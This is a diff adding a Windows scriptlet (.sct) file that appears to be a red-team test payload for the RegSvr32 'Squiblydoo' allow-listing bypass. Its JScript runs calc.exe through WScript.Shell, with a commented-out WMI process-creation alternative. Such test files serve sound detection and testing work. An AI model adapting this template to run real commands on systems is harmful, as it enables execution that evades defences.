@@ -1,0 +1,32 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration
+    description="NEBULA Test SCT"
+    progid="NebulaTest"
+    version="1.00"
+    classid="{A1112221-0000-0000-0000-0000FEEDACDC}"
+    remotable="true"
+>
+</registration>
+
+<script language="JScript">
+<![CDATA[
+    // NEBULA Test Payload - SCT File
+    // This is a sample scriptlet file for testing RegSvr32 Squiblydoo technique
+
+    var objShell = new ActiveXObject("WScript.Shell");
+
+    // Safe test - just pop calc
+    objShell.Run("calc.exe", 0, false);
+
+    // Alternative WMI execution method
+    // var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
+    // var startup = wmi.Get("Win32_ProcessStartup").SpawnInstance_();
+    // startup.ShowWindow = 0;
+    // var process = wmi.Get("Win32_Process");
+    // process.Create("calc.exe", null, startup);
+
+]]>
+</script>
+</scriptlet>
+
